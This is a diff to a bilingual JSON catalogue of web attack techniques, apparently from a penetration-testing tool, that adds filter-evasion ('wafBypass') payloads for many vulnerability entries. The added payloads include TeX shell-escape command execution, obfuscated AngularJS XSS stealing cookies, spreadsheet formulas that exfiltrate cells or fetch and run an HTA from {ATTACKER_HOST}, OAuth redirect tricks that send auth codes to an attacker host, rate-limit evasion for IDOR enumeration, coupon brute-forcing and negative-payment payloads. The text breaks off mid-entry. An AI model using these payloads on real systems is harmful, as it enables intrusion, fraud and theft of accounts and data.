@@ -42,8 +42,8 @@
         "en": "Server-Side Request Forgery (SSRF)"
       },
       "subCategory": {
-        "zh": "LaTeX 远程资源包含",
-        "en": "LaTeX Remote Resource Inclusion"
+        "zh": "文档渲染器 SSRF",
+        "en": "Document Renderer SSRF"
       },
       "tutorial": {
         "overview": {
@@ -110,7 +110,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "includegraphics 宏替代",
+            "en": "includegraphics Macro Alternative"
+          },
+          "command": "\\includegraphics[width=0.1pt]{http://{LAB_OAST}/}",
+          "description": {
+            "zh": "绕过对 \\input 宏的编译白名单：改用图形包含宏触发远程资源拉取；{LAB_OAST} 收到请求即成功。",
+            "en": "Trigger the remote fetch via the graphics macro when \\input is allowlisted away; a request arriving at {LAB_OAST} confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "IfFileExists 盲探测",
+            "en": "IfFileExists Blind Probe"
+          },
+          "command": "\\IfFileExists{/etc/passwd}{\\input{http://{LAB_OAST}/exists}}{\\input{http://{LAB_OAST}/missing}}",
+          "description": {
+            "zh": "绕过对出网地址的日志审计：用条件宏按本地文件存在性选择出网路径，形成盲通道；回指 URL 区分出 exists/missing 即成功。",
+            "en": "Turn local file existence into a blind channel by choosing the callback URL conditionally; the callback URL distinguishing exists/missing confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "文件名十六进制混淆",
+            "en": "Hex-Obfuscated Filename"
+          },
+          "command": "\\input{http://\\%%31\\%%32\\%%37.0.0.1/}",
+          "description": {
+            "zh": "绕过对明文回环地址的编译日志与过滤：地址部分转义表示；编译器仍发起连接即成功。",
+            "en": "Escape parts of the loopback address to evade plaintext filters while the compiler still connects; a successful connection attempt confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-rce",
@@ -151,8 +186,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "TeX 编译器 Shell Escape",
-        "en": "TeX Compiler Shell Escape"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -219,7 +254,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "input 管道执行",
+            "en": "Pipe via \\input"
+          },
+          "command": "\\input|id|",
+          "description": {
+            "zh": "绕过对 write18 关键词的过滤：利用 TeX \\input 的管道语法执行命令；成功判据：编译日志或输出出现 uid 信息。",
+            "en": "Bypasses filters on the write18 keyword by exploiting TeX pipe syntax in \\input. Success: uid info appears in the compile log or output."
+          }
+        },
+        {
+          "title": {
+            "zh": "csname 关键词混淆",
+            "en": "csname Keyword Obfuscation"
+          },
+          "command": "\\immediate\\csname\\detokenize{write18}\\endcsname{id}",
+          "description": {
+            "zh": "用 \\csname+\\detokenize 动态构造 write18，规避对其字面量的匹配；成功判据：命令输出出现在日志。",
+            "en": "Builds write18 dynamically via \\csname+\\detokenize to evade literal matching. Success: command output shows in the log."
+          }
+        },
+        {
+          "title": {
+            "zh": "detokenize 参数变形",
+            "en": "detokenize Argument Mutation"
+          },
+          "command": "\\immediate\\write18{\\detokenize{id}}",
+          "description": {
+            "zh": "命令参数经 \\detokenize 展开，打断 write18{cmd} 结构匹配；成功判据：编译输出含命令结果。",
+            "en": "Wraps the argument in \\detokenize to break the write18{cmd} structural match. Success: compile output contains the command result."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-bleichenbacher-pkcs-1-v1-5",
@@ -445,6 +515,52 @@
       "tags": [
         "bizlogic",
         "javascript_redos"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Unicode/十六进制转义构造填充",
+            "en": "Unicode/hex-escaped filler construction"
+          },
+          "command": "node -e \"const t0=Date.now(); /(a+)+$/.test('\\u0061'.repeat(30)+'!'); console.log('unicode', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(a+)+$/.test('\\x61'.repeat(30)+'!'); console.log('hex', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(a+)+$/.test(String.fromCharCode(97).repeat(30)+'!'); console.log('fromCharCode', Date.now()-t0, 'ms');\"",
+          "description": {
+            "zh": "绕过对连续字面 aaaa 长串的输入签名检测：用 \\u0061、\\x61 与 String.fromCharCode 运行期构造同一字符串，传输层只见短标记；成功判据：计时显著高于空跑基线且随长度指数增长，证明正则引擎仍在灾难性回溯。",
+            "en": "Bypasses input signatures on long literal aaaa runs: \\u0061, \\x61 and String.fromCharCode build the same string at runtime so only short tokens cross the wire; success criterion: timing far exceeds the empty baseline and grows exponentially, proving the regex engine still catastrophic backtracks."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套量词等价形态集",
+            "en": "Equivalent nested-quantifier shape set"
+          },
+          "command": "node -e \"const t0=Date.now(); new RegExp('(a+)+$').test('a'.repeat(30)+'!'); console.log('group-plus', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(a|aa)+$/.test('a'.repeat(30)+'!'); console.log('alt-repeat', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(a*)*$/.test('a'.repeat(30)+'!'); console.log('star-star', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(a?)*b/.test('a'.repeat(30)+'!'); console.log('opt-group', Date.now()-t0, 'ms');\"",
+          "description": {
+            "zh": "绕过只识别单一邪恶模式（如 (a+)+）的输入/规则过滤：(a|aa)+、(a*)*、(a?)*b 是回溯复杂度等价的嵌套量词形态，同一输入可切换形态复测；成功判据：多个形态计时均随长度翻倍而平方/指数上升。",
+            "en": "Bypasses filters recognizing only one evil pattern such as (a+)+: (a|aa)+, (a*)* and (a?)*b are backtrack-equivalent nested-quantifier shapes the same input can switch between; success criterion: several shapes show quadratic/exponential timing growth as length doubles."
+          }
+        },
+        {
+          "title": {
+            "zh": "长度阶梯计时驱动",
+            "en": "Length-ladder timing driver"
+          },
+          "command": "node -e \"const re=/(a+)+$/; for (const n of [12,16,20,24,28,30]) { const t=Date.now(); re.test('a'.repeat(n)+'!'); console.log(n, Date.now()-t, 'ms'); }\"",
+          "description": {
+            "zh": "绕过对固定长度输入的阈值检测：阶梯递增长度（12→30）动态逼近引擎回溯上限，单条请求都低于限速阈值而整体确认多项式复杂度；成功判据：耗时随 n 增长呈指数级（每 +4 长度约翻倍以上）。",
+            "en": "Bypasses threshold detection on fixed-length inputs: stepping the length (12 to 30) approaches the engine backtracking ceiling while each single request stays under rate limits, jointly confirming polynomial complexity; success criterion: time grows exponentially with n (roughly doubling per +4)."
+          }
+        },
+        {
+          "title": {
+            "zh": "边界字符编码等价变体",
+            "en": "Boundary-char encoding equivalents"
+          },
+          "command": "node -e \"for (const b of ['!','\\u0021','X','\\u0058','~','^','\\t','\\n','#','@']) { const t=Date.now(); /(a+)+$/.test('a'.repeat(30)+b); console.log(JSON.stringify(b), Date.now()-t, 'ms'); }\"",
+          "description": {
+            "zh": "绕过对 \"长 a 串+特定边界符\" 的组合签名：用 Unicode 码位（\\u0021 即 !、\\u0058 即 X）与多种边界字符逐一探测引擎回溯，编码形态改变字面签名；成功判据：多个编码边界均触发高耗时（与直接字面边界一致）。",
+            "en": "Bypasses combined signatures on \"long a-run + specific boundary char\": probing backtracking with Unicode code points (\\u0021 for !, \\u0058 for X) and varied boundaries changes the literal signature; success criterion: multiple encoded boundaries trigger the same high timing as the literal one."
+          }
+        }
       ]
     },
     {
@@ -486,8 +602,8 @@
         "en": "Business Logic Vulnerabilities"
       },
       "subCategory": {
-        "zh": "IDOR 与对象级授权",
-        "en": "IDOR and Object-Level Authorization"
+        "zh": "越权与对象枚举",
+        "en": "IDOR & Object Enumeration"
       },
       "tutorial": {
         "overview": {
@@ -554,7 +670,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "限速规避并发枚举",
+            "en": "Rate-limit-evasion enumeration"
+          },
+          "command": "ffuf -w <(seq 1000 1100) -u 'https://{TARGET}/api/users/FUZZ' -H 'Authorization: Bearer {TOKEN}' -mc 200 -rate 20 -t 5",
+          "description": {
+            "zh": "绕过频控：限速并发让枚举低于告警阈值。判据：以 200 状态筛出有效对象。",
+            "en": "Throttled concurrency keeps enumeration under alert thresholds. Success: valid objects flagged by 200s."
+          }
+        },
+        {
+          "title": {
+            "zh": "X-Forwarded-For 轮换",
+            "en": "X-Forwarded-For rotation"
+          },
+          "command": "for id in $(seq 1000 1010); do curl -s -o /dev/null -w '%{http_code}\\n' -H 'Authorization: Bearer {TOKEN}' -H \"X-Forwarded-For: $RANDOM.$RANDOM.0.1\" https://{TARGET}/api/users/$id; done",
+          "description": {
+            "zh": "伪造来源 IP 绕过基于源地址的限速。判据：连续请求不触发 429。",
+            "en": "Spoofed source IPs defeat address-based rate limits. Success: no 429s during the run."
+          }
+        },
+        {
+          "title": {
+            "zh": "批量节点查询",
+            "en": "Batched node query"
+          },
+          "command": "{\"query\":\"{users(ids:[1001,1002,1003,1004]){id email role}}\"}",
+          "description": {
+            "zh": "以批量查询一次取多对象降低请求次数。判据：单响应返回多账号数据。",
+            "en": "Batching lowers request counts. Success: multiple accounts returned in one response."
+          }
+        },
+        {
+          "title": {
+            "zh": "格式变换枚举",
+            "en": "Format-shift enumeration"
+          },
+          "command": "for f in '{TARGET_ID}' '{TARGET_ID}-v2' 'u{TARGET_ID}' '1000{TARGET_ID}'; do curl -s -o /dev/null -w '%{http_code} '$f'\\n' -H 'Authorization: Bearer {TOKEN}' https://{TARGET}/api/users/$f; done",
+          "description": {
+            "zh": "变换 ID 格式绕过按格式匹配的枚举检测。判据：任一格式返回 200。",
+            "en": "Format variations dodge format-based enumeration detection. Success: any format returns 200."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-",
@@ -595,8 +757,8 @@
         "en": "Business Logic Vulnerabilities"
       },
       "subCategory": {
-        "zh": "优惠权益滥用",
-        "en": "Promotional Benefit Abuse"
+        "zh": "越权与对象枚举",
+        "en": "IDOR & Object Enumeration"
       },
       "tutorial": {
         "overview": {
@@ -663,7 +825,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "字典批量验证",
+            "en": "Dictionary batch validation"
+          },
+          "command": "ffuf -w coupons.txt -u 'https://{TARGET}/api/coupon/FUZZ' -H 'Authorization: Bearer {TOKEN}' -mc 200 -rate 15",
+          "description": {
+            "zh": "以常见优惠码字典限速探测。判据：200 响应即有效码。",
+            "en": "Throttled dictionary probing. Success: 200s mark valid codes."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写变形枚举",
+            "en": "Case-variant enumeration"
+          },
+          "command": "for c in coupon001 Coupon001 COUPON001; do curl -s -o /dev/null -w '%{http_code} '$c'\\n' https://{TARGET}/api/coupon/$c; done",
+          "description": {
+            "zh": "大小写差异绕过码格式校验。判据：任一大小写被接受。",
+            "en": "Case variance bypasses format validation. Success: any casing accepted."
+          }
+        },
+        {
+          "title": {
+            "zh": "年份前缀枚举",
+            "en": "Year-prefix enumeration"
+          },
+          "command": "for y in 2021 2022 2023 2024 2025; do curl -s -o /dev/null -w '%{http_code} SAVE$y\\n' https://{TARGET}/api/coupon/SAVE$y; done",
+          "description": {
+            "zh": "按年份命名规律探测批量码。判据：命中有效年份码。",
+            "en": "Year-pattern probing. Success: a valid year code hits."
+          }
+        },
+        {
+          "title": {
+            "zh": "参数叠加批量试",
+            "en": "HPP batch trial"
+          },
+          "command": "?coupon=C001&coupon=C002&coupon=C003",
+          "description": {
+            "zh": "重复参数一次请求试多码。判据：任一码生效的响应差异。",
+            "en": "One request tries several codes. Success: response delta when any code applies."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic--ext",
@@ -704,8 +912,8 @@
         "en": "Business Logic Vulnerabilities"
       },
       "subCategory": {
-        "zh": "支付金额完整性",
-        "en": "Payment Amount Integrity"
+        "zh": "业务流程滥用",
+        "en": "Business Process Abuse"
       },
       "tutorial": {
         "overview": {
@@ -772,7 +980,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "科学计数法金额",
+            "en": "Scientific-notation amount"
+          },
+          "command": "{\"amount\": 1e-2}",
+          "description": {
+            "zh": "科学计数法绕过小数位与最小值校验。判据：以 0.01 或更低金额成交。",
+            "en": "Scientific notation slips past decimal/min checks. Success: order placed at 0.01 or lower."
+          }
+        },
+        {
+          "title": {
+            "zh": "字符串数字混淆",
+            "en": "String-number confusion"
+          },
+          "command": "{\"amount\": \"-1.00\"}",
+          "description": {
+            "zh": "字符串型数字绕过数值类型校验。判据：订单创建成功且金额为负。",
+            "en": "String-typed numbers bypass numeric validation. Success: order created with negative amount."
+          }
+        },
+        {
+          "title": {
+            "zh": "整数溢出边界",
+            "en": "Integer overflow boundary"
+          },
+          "command": "{\"amount\": 2147483648}",
+          "description": {
+            "zh": "超 int32 触发后端溢出绕过上限。判据：金额回绕为负或零成交。",
+            "en": "Beyond int32 wraps around. Success: amount wraps to negative or zero at checkout."
+          }
+        },
+        {
+          "title": {
+            "zh": "参数叠加负金额",
+            "en": "HPP negative amount"
+          },
+          "command": "amount=0.00&amount=-1.00",
+          "description": {
+            "zh": "重复参数取值差异注入负数。判据：结算金额异常。",
+            "en": "Divergent picks on repeated params inject a negative value. Success: settlement amount abnormal."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-token-session",
@@ -813,8 +1067,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "会话标识可预测性",
-        "en": "Session Identifier Predictability"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -881,7 +1135,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "步长变形遍历",
+            "en": "Stride-Mutation Traversal"
+          },
+          "command": "token010\ntoken020\ntoken030\ntoken100\ntoken200",
+          "description": {
+            "zh": "大步长采样快速定位序号生成规律。成功判据：预测的中间值亦有效。",
+            "en": "Large strides quickly locate the sequence generation pattern. Success: predicted intermediate values also work."
+          }
+        },
+        {
+          "title": {
+            "zh": "混合进制序列",
+            "en": "Mixed-Radix Sequence"
+          },
+          "command": "token00a\ntoken00b\ntoken00f\ntoken010\ntoken0ff",
+          "description": {
+            "zh": "hex 递增序列检验进制混用的可预测性。成功判据：hex 邻值连续有效。",
+            "en": "Hex increments test predictability of mixed-radix generation. Success: adjacent hex values are consecutively valid."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写基名变形",
+            "en": "Case-Mutated Base"
+          },
+          "command": "Token001\nTOKEN002\ntOkEn003\ntoken001",
+          "description": {
+            "zh": "大小写变形绕过黑名单精确匹配后序号仍有效。成功判据：任一变形值被采信。",
+            "en": "Case mutations bypass exact-match blacklists while sequences stay valid. Success: any mutated value is honored."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-json-body",
@@ -922,8 +1211,8 @@
         "en": "Prototype Pollution"
       },
       "subCategory": {
-        "zh": "原型污染属性名字典",
-        "en": "Prototype-Pollution Property Dictionary"
+        "zh": "服务端 JSON 合并污染",
+        "en": "Server-side JSON Merge Pollution"
       },
       "tutorial": {
         "overview": {
@@ -990,7 +1279,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Unicode 转义键名",
+            "en": "Unicode-Escaped Keys"
+          },
+          "command": "{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"evilProperty\": \"evilPayload\"}}\n{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"isAdmin\": true}}",
+          "description": {
+            "zh": "绕过 JSON 体 __proto__ 明文特征：转义在解析后还原。成功判据：目标对象出现注入属性。",
+            "en": "Bypasses plaintext __proto__ in the JSON body since escapes resolve after parsing. Success: the target object exhibits injected properties."
+          }
+        },
+        {
+          "title": {
+            "zh": "constructor.prototype 等价语法",
+            "en": "constructor.prototype Equivalent Syntax"
+          },
+          "command": "{\"constructor\": {\"prototype\": {\"evilProperty\": \"evilPayload\"}}}\n{\"constructor\": {\"prototype\": {\"admin\": true}}}",
+          "description": {
+            "zh": "绕过 __proto__ 键黑名单：等价路径完成污染。成功判据：原型上出现注入属性。",
+            "en": "Bypasses __proto__ key blacklists via the equivalent path. Success: injected properties appear on the prototype."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套载体包裹",
+            "en": "Nested Carrier Wrapping"
+          },
+          "command": "{\"data\": {\"__proto__\": {\"isAdmin\": true}}}\n{\"items\": [{\"__proto__\": {\"admin\": true}}]}",
+          "description": {
+            "zh": "把污染键藏进深层嵌套绕过顶层键扫描。成功判据：深合并路径触达原型。",
+            "en": "Hiding the pollution key inside deep nesting bypasses top-level key scanning. Success: the deep merge path reaches the prototype."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-url",
@@ -1031,8 +1355,8 @@
         "en": "Prototype Pollution"
       },
       "subCategory": {
-        "zh": "查询字符串原型污染",
-        "en": "Query-String Prototype Pollution"
+        "zh": "替代语法与查询对象污染",
+        "en": "Alternative Syntax & Query Object Pollution"
       },
       "tutorial": {
         "overview": {
@@ -1099,7 +1423,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码键名",
+            "en": "Double-Encoded Keys"
+          },
+          "command": "?%255F%255Fproto%255F%255F[evilProperty]=evilPayload\n?%255F%255Fproto%255F%255F[isAdmin]=true",
+          "description": {
+            "zh": "绕过一次解码后匹配 __proto__ 的 WAF：第二层解码在 qs 解析时完成。成功判据：解析后触达原型。",
+            "en": "Bypasses WAFs matching __proto__ after one decode since the second decode happens during qs parsing. Success: the parsed key reaches the prototype."
+          }
+        },
+        {
+          "title": {
+            "zh": "constructor 括号语法",
+            "en": "constructor Bracket Syntax"
+          },
+          "command": "?constructor[prototype][evilProperty]=evilPayload\n?constructor[prototype][isAdmin]=true",
+          "description": {
+            "zh": "绕过 __proto__ 键名黑名单：等价构造器路径。成功判据：污染生效。",
+            "en": "Bypasses __proto__ key blacklists via the equivalent constructor path. Success: pollution takes effect."
+          }
+        },
+        {
+          "title": {
+            "zh": "点号解析变形",
+            "en": "Dot-Parsing Mutation"
+          },
+          "command": "?__proto__.evilProperty=evilPayload\n?__proto__.isAdmin=true&__proto__.role=admin",
+          "description": {
+            "zh": "依赖 qs 的 allowDots 解析，点路径形态绕过中括号特征。成功判据：点路径完成污染。",
+            "en": "Relying on qs allowDots, the dot-path form evades bracket signatures. Success: the dot path completes pollution."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-angularjs-1-6",
@@ -1140,8 +1499,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "AngularJS 表达式型 XSS",
-        "en": "AngularJS Expression-Based XSS"
+        "zh": "DOM 型与解析突变",
+        "en": "DOM XSS & Parser Mutation"
       },
       "tutorial": {
         "overview": {
@@ -1208,7 +1567,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "fromCharCode 构造",
+            "en": "fromCharCode construction"
+          },
+          "command": "{{constructor.constructor(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+          "description": {
+            "zh": "绕过引号内关键词检测：字符码构造代码串。判据：弹出域名。",
+            "en": "Builds the code from char codes. Success: domain alerted."
+          }
+        },
+        {
+          "title": {
+            "zh": "atob 解码执行",
+            "en": "atob-decoded execution"
+          },
+          "command": "{{constructor.constructor(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))()}}",
+          "description": {
+            "zh": "绕过引号内容检测：base64 解码执行。判据：弹窗。",
+            "en": "Base64-decodes the code at runtime. Success: alert."
+          }
+        },
+        {
+          "title": {
+            "zh": "备用 gadget 链",
+            "en": "Alternate gadget chain"
+          },
+          "command": "{{ 'a'.constructor.constructor('alert(document.cookie)')() }}",
+          "description": {
+            "zh": "绕过 constructor.constructor 精确匹配：经字符串构造器链式到达。判据：弹出 cookie。",
+            "en": "Reaches the constructor via a string primitive. Success: cookie alerted."
+          }
+        },
+        {
+          "title": {
+            "zh": "花括号编码",
+            "en": "Encoded braces"
+          },
+          "command": "%7B%7Bconstructor.constructor('alert(1)')()%7D%7D",
+          "description": {
+            "zh": "绕过 {{ 检测：URL 编码提交。判据：解码后表达式执行。",
+            "en": "URL-encoded braces for {{ filters. Success: expression evaluates."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-csv-csv-injection",
@@ -1249,8 +1654,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "电子表格公式执行",
-        "en": "Spreadsheet Formula Execution"
+        "zh": "文档活动内容与公式注入",
+        "en": "Active Content & Formula Injection"
       },
       "tutorial": {
         "overview": {
@@ -1321,6 +1726,41 @@
       "tags": [
         "bizlogic",
         "csv_csv_injection"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "HYPERLINK 诱导",
+            "en": "HYPERLINK lure"
+          },
+          "command": "=HYPERLINK(\"http://{ATTACKER_HOST}\",\"Invoice\")",
+          "description": {
+            "zh": "公式超链接替代命令执行。判据：受害者点击访问。",
+            "en": "Hyperlink instead of command exec. Success: victim clicks through."
+          }
+        },
+        {
+          "title": {
+            "zh": "CONCAT 外带",
+            "en": "CONCAT exfil"
+          },
+          "command": "=WEBSERVICE(CONCAT(\"http://{ATTACKER_HOST}/?v=\",A1))",
+          "description": {
+            "zh": "拼接外带单元格数据。判据：服务端收到数据。",
+            "en": "Concatenated cell exfil. Success: data received."
+          }
+        },
+        {
+          "title": {
+            "zh": "mshta 载荷变体",
+            "en": "mshta payload variant"
+          },
+          "command": "=cmd|'/C mshta http://{ATTACKER_HOST}/a.hta'!A0",
+          "description": {
+            "zh": "mshta 拉取 HTA 执行。判据：HTA 运行。",
+            "en": "mshta fetches and runs the HTA. Success: HTA executes."
+          }
+        }
       ]
     },
     {
@@ -1362,8 +1802,8 @@
         "en": "Open Redirect"
       },
       "subCategory": {
-        "zh": "OAuth 回调地址绑定",
-        "en": "OAuth Redirect URI Binding"
+        "zh": "目标校验绕过",
+        "en": "Target Validation Bypass"
       },
       "tutorial": {
         "overview": {
@@ -1430,7 +1870,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "点前缀子域变体",
+            "en": "Dot-Prefix Subdomain Variant"
+          },
+          "command": "redirect_uri=https://{TARGET}/callback/.{ATTACKER_HOST}",
+          "description": {
+            "zh": "回调路径后接 .{攻击者域}，绕过只查前缀 https://{TARGET} 的白名单校验；成功判据：授权码被重定向到攻击者域。",
+            "en": "Appends .attacker-host after the allowed callback path to bypass prefix-only allowlist checks. Success: the auth code is redirected to the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "userinfo 变体",
+            "en": "userinfo Variant"
+          },
+          "command": "redirect_uri=https://{TARGET}@{ATTACKER_HOST}/callback",
+          "description": {
+            "zh": "白名单域放进 userinfo 位，真实 host 为攻击者；成功判据：跳转实际到达攻击者服务器。",
+            "en": "Puts the allowlisted domain in userinfo while the real host is the attacker. Success: the hop actually reaches the attacker server."
+          }
+        },
+        {
+          "title": {
+            "zh": "双重编码穿越变体",
+            "en": "Double-Encoded Traversal Variant"
+          },
+          "command": "redirect_uri=https%3A%2F%2F{TARGET}%2Fcallback%2F..%252f{ATTACKER_HOST}",
+          "description": {
+            "zh": "路径段 .. 双重编码穿越回调前缀，二次解码后指向外域；成功判据：授权响应落到攻击者域。",
+            "en": "Double-encodes the traversal to escape the callback prefix after a second decode. Success: the auth response lands on the attacker host."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-state",
@@ -1471,8 +1946,8 @@
         "en": "CSRF Cross-Site Request Forgery"
       },
       "subCategory": {
-        "zh": "OAuth 登录 CSRF",
-        "en": "OAuth Login CSRF"
+        "zh": "OAuth 与遗留跨域边界",
+        "en": "OAuth & Legacy Cross-Domain"
       },
       "tutorial": {
         "overview": {
@@ -1540,7 +2015,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "URL 编码注入",
+            "en": "URL-encoded injection"
+          },
+          "command": "state=%2F%2F{ATTACKER_HOST}%2Fcallback",
+          "description": {
+            "zh": "编码斜杠绕过明文外域检测。判据：重定向至攻击域。",
+            "en": "Encoded slashes evade plaintext external-domain rules. Success: redirect to attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "双重编码注入",
+            "en": "Double-encoded injection"
+          },
+          "command": "state=%252F%252F{ATTACKER_HOST}",
+          "description": {
+            "zh": "二次解码还原 // 前缀。判据：解码后跳转攻击域。",
+            "en": "Second decode restores the // prefix. Success: navigates to attacker host after decoding."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套参数注入",
+            "en": "Nested parameter injection"
+          },
+          "command": "state[url]=https://{ATTACKER_HOST}&state[enabled]=1",
+          "description": {
+            "zh": "框架将 state 解析为数组时 url 键被采用。判据：回调指向攻击域。",
+            "en": "Framework parses state as an array honoring the url key. Success: callback points at the attacker host."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-evil-regex",
@@ -1652,7 +2162,53 @@
         "targetToolIds": [
           "vulnerability-research"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "转义构造阶梯计时",
+            "en": "Escaped-construction ladder timing"
+          },
+          "command": "node -e \"const re=/(a+)+$/; for (const n of [12,16,20,24,28,32,36]) { const t=Date.now(); re.test('\\u0061'.repeat(n)+'!'); console.log(n, Date.now()-t, 'ms'); }\"",
+          "description": {
+            "zh": "绕过对连续字面 aaaa 阶梯串的签名：以 \\u0061 转义在运行期构造同一阶梯（12→36），传输内容不含长 a 串；成功判据：耗时随长度指数增长，确认邪恶正则存在。",
+            "en": "Bypasses signatures on literal aaaa ladder runs: the same ladder (12 to 36) is built at runtime via \\u0061 escapes so no long a-run crosses the wire; success criterion: exponential timing growth confirms the evil regex."
+          }
+        },
+        {
+          "title": {
+            "zh": "等价嵌套形态集测",
+            "en": "Equivalent nested-shape battery"
+          },
+          "command": "node -e \"const s='\\u0061'.repeat(24)+'!'; for (const p of ['(a+)+$','(a|aa)+$','(a*)*b','(a|a?)+$','([a]+)+$']) { const t=Date.now(); new RegExp(p).test(s); console.log(p, Date.now()-t, 'ms'); }\"",
+          "description": {
+            "zh": "绕过只防 (a+)+ 一种量词写法的规则：(a|aa)+、(a*)*b、(a|a?)+、([a]+)+ 均为回溯等价形态，轮换测出同样灾难行为；成功判据：多数形态在同一输入上出现毫秒级以上回溯耗时。",
+            "en": "Bypasses rules guarding only the (a+)+ shape: (a|aa)+, (a*)*b, (a|a?)+ and ([a]+)+ are backtrack-equivalent alternates exposing the same blowup; success criterion: most shapes take millisecond-plus backtracking on the same input."
+          }
+        },
+        {
+          "title": {
+            "zh": "阶梯边界字符变体",
+            "en": "Ladder boundary-char variants"
+          },
+          "command": "aaaaaaaaaaaaaaaaaaaaaaaa~\naaaaaaaaaaaaaaaaaaaa^\naaaaaaaaaaaaaaaa-\naaaaaaaa+\naaaaaaaa_",
+          "description": {
+            "zh": "绕过对 \"a 串+!\" 固定边界的输入检测：换用 ~ ^ - + _ 等非匹配字符做阶梯终止符，失配位置不变、回溯复杂度等价；成功判据：各边界变体耗时与 ! 版本同量级。",
+            "en": "Bypasses input checks fixed on the \"a-run+!\" boundary: alternate non-matching terminators ~ ^ - + _ keep the mismatch point and backtracking complexity equivalent; success criterion: each boundary variant times in the same order as the ! version."
+          }
+        },
+        {
+          "title": {
+            "zh": "包裹上下文与编码边界",
+            "en": "Wrapped contexts and encoded boundaries"
+          },
+          "command": "q=aaaaaaaaaaaaaaaaaaaaaaaa!\n{\"field\":\"regex\",\"value\":\"aaaaaaaaaaaaaaaaaaaaaaaa!\"}\n<value>aaaaaaaaaaaaaaaaaaaaaaaa!</value>\nq=aaaaaaaaaaaaaaaaaaaaaaaa%21\nq=aaaaaaaaaaaaaaaaaaaaaaaa%2521",
+          "description": {
+            "zh": "绕过对裸长字符串参数的检测：载荷藏进表单字段名 q、JSON 值与 XML 文本等应用层上下文，边界符再以 %21/%2521 编码，进入正则前由应用解码；成功判据：包裹与编码形态均触发相同回溯延迟。",
+            "en": "Bypasses detection of bare long-string parameters: the payload hides in a form field q, JSON value or XML text, with the boundary encoded as %21/%2521 and decoded by the app before the regex; success criterion: wrapped and encoded forms trigger the same backtracking delay."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-dns",
@@ -1693,8 +2249,8 @@
         "en": "Server-Side Request Forgery (SSRF)"
       },
       "subCategory": {
-        "zh": "DNS 重绑定与解析一致性",
-        "en": "DNS Rebinding and Resolution Consistency"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -1761,7 +2317,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "通配域加端口分流",
+            "en": "Wildcard Domain with Port Split"
+          },
+          "command": "http://192.168.1.1.nip.io:8080/\nhttp://192.168.1.1.nip.io:3306/",
+          "description": {
+            "zh": "绕过按主机名黑名单的判定：同一通配域名下用端口区分内网服务；端口响应差异可辨即成功。",
